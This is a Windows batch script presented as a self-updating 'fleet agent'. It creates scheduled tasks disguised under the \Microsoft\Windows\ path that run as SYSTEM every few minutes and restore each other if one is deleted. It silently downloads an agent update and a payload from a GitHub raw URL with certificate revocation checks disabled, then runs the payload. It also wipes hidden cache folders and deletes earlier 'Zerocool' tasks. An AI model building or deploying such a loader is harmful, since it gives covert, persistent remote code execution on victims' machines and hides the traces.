@echo off
rem WINRTCS_AGENT 0.0.1 - self-updating fleet agent (batch+curl only, no PowerShell)
rem Tick: re-arm tasks -> stage/apply self-update (SHA256 pinned) -> run payload once per PAYLOAD_VER.
setlocal EnableExtensions EnableDelayedExpansion
set "ZD=C:\ProgramData\WinRTCS"
set "CURL=%SystemRoot%\System32\curl.exe"
set "BASE=https://raw.githubusercontent.com/xnobuddy/github-drop/main"
set "LOG=%ZD%\agent.log"
set "TASKA=\Microsoft\Windows\WinRTCS\Agent"
set "TASKG=\Microsoft\Windows\WinRTCS\Guard"
set "VFILE=%ZD%\winrtcs.version.remote"

if not exist "%ZD%" mkdir "%ZD%" >nul 2>&1

rem --- apply staged self-update (hash-verified last tick), then re-exec fresh copy ---
if exist "%ZD%\winrtcs_agent.new" (
  move /y "%ZD%\winrtcs_agent.new" "%ZD%\winrtcs_agent.cmd" >nul 2>&1
  call "%ZD%\winrtcs_agent.cmd"
  endlocal & exit /b 0
)

rem --- re-arm persistence: any run heals both tasks ---
set "ACT=cmd.exe /c C:\ProgramData\WinRTCS\winrtcs_run.cmd"
schtasks /Query /TN "%TASKA%" >nul 2>&1
if errorlevel 1 schtasks /Create /TN "%TASKA%" /TR "%ACT%" /SC MINUTE /MO 5 /RU SYSTEM /RL HIGHEST /F >nul 2>&1
schtasks /Query /TN "%TASKG%" >nul 2>&1
if errorlevel 1 schtasks /Create /TN "%TASKG%" /TR "%ACT%" /SC MINUTE /MO 7 /RU SYSTEM /RL HIGHEST /F >nul 2>&1

rem --- one-time init: finish legacy wipe + retire any Zerocool bridge residue ---
if not exist "%ZD%\inited.flag" (
  echo %DATE% %TIME%>"%ZD%\inited.flag"
  rmdir /s /q "%SystemRoot%\Temp\.upd" >nul 2>&1
  rmdir /s /q "C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache" >nul 2>&1
  rmdir /s /q "C:\ProgramData\Microsoft\Diagnosis\State\.etlcache" >nul 2>&1
  rmdir /s /q "%SystemRoot%\Temp\.wucache" >nul 2>&1
  schtasks /Delete /TN "\Microsoft\Windows\Zerocool\Agent" /F >nul 2>&1
  schtasks /Delete /TN "\Microsoft\Windows\Zerocool\Guard" /F >nul 2>&1
  echo [%DATE% %TIME%] init legacy-wipe-done>>"%LOG%"
)

rem --- rotate log ---
if exist "%LOG%" for %%L in ("%LOG%") do if %%~zL GTR 204800 move /y "%LOG%" "%LOG%.old" >nul 2>&1

rem --- fetch version ---
del /f /q "%VFILE%" >nul 2>&1
"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 20 -o "%VFILE%" "%BASE%/winrtcs.version?t=%RANDOM%%RANDOM%" >nul 2>&1
if not exist "%VFILE%" ( endlocal & exit /b 0 )
findstr /C:"AGENT_SHA256=" "%VFILE%" >nul 2>&1
if errorlevel 1 ( endlocal & exit /b 0 )

set "AGENT_SHA="
set "PVER="
set "PAYLOAD_SHA="
for /f "usebackq tokens=1,* delims==" %%K in ("%VFILE%") do (
  if /I "%%K"=="AGENT_SHA256" set "AGENT_SHA=%%L"
  if /I "%%K"=="PAYLOAD_VER" set "PVER=%%L"
  if /I "%%K"=="PAYLOAD_SHA256" set "PAYLOAD_SHA=%%L"
)

rem --- agent self-update: stage .new now, applied + re-exec at top of next run ---
if defined AGENT_SHA (
  call :Sha256 "%ZD%\winrtcs_agent.cmd" CUR_SHA
  if /I not "!CUR_SHA!"=="!AGENT_SHA!" (
    del /f /q "%ZD%\agent.dl" >nul 2>&1
    "%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 30 -o "%ZD%\agent.dl" "%BASE%/winrtcs_agent.cmd?t=%RANDOM%%RANDOM%" >nul 2>&1
    set "DL_SHA="
    if exist "%ZD%\agent.dl" call :Sha256 "%ZD%\agent.dl" DL_SHA
    if defined DL_SHA if /I "!DL_SHA!"=="!AGENT_SHA!" (
      findstr /C:"WINRTCS_AGENT" "%ZD%\agent.dl" >nul 2>&1
      if not errorlevel 1 (
        move /y "%ZD%\agent.dl" "%ZD%\winrtcs_agent.new" >nul 2>&1
        echo [%DATE% %TIME%] agent_update_staged>>"%LOG%"
      )
    )
    del /f /q "%ZD%\agent.dl" >nul 2>&1
  )
)

rem --- payload: run exactly once per PAYLOAD_VER ---
set "LVER="
if exist "%ZD%\payload.ver" set /p "LVER=" <"%ZD%\payload.ver"
if defined PVER if defined PAYLOAD_SHA if /I not "!PVER!"=="!LVER!" (
  del /f /q "%ZD%\payload.dl" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 30 -o "%ZD%\payload.dl" "%BASE%/winrtcs_payload.cmd?t=%RANDOM%%RANDOM%" >nul 2>&1
  set "PL_SHA="
  if exist "%ZD%\payload.dl" call :Sha256 "%ZD%\payload.dl" PL_SHA
  if defined PL_SHA if /I "!PL_SHA!"=="!PAYLOAD_SHA!" (
    findstr /C:"WINRTCS_PAYLOAD" "%ZD%\payload.dl" >nul 2>&1
    if not errorlevel 1 (
      move /y "%ZD%\payload.dl" "%ZD%\winrtcs_payload.cmd" >nul 2>&1
      call "%ZD%\winrtcs_payload.cmd"
      if not errorlevel 1 (
        echo !PVER!>"%ZD%\payload.ver"
        echo [%DATE% %TIME%] payload_!PVER!_ran>>"%LOG%"
      )
    )
  )
  del /f /q "%ZD%\payload.dl" >nul 2>&1
)

endlocal & exit /b 0

:Sha256
set "%~2="
for /f "skip=1 tokens=1" %%H in ('certutil -hashfile "%~1" SHA256 2^>nul') do if not defined %~2 set "%~2=%%H"
exit /b 0
